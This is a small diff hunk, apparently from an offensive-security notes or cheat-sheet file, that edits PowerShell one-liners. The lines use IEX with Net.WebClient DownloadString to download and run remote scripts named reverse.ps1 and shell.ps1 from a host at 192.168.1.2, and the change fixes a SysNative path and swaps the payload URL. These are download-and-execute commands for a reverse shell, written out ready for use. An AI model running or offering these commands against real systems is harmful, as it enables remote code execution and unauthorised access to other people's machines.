@@ -385,7 +385,7 @@
   
   powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.2:8000/reverse.ps1')
    
-  C:\Windows\SysNative\Windows\PowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.2:8000/reverse.ps1') 
+  C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.2/shell.ps1')  
   ```
   
   ---
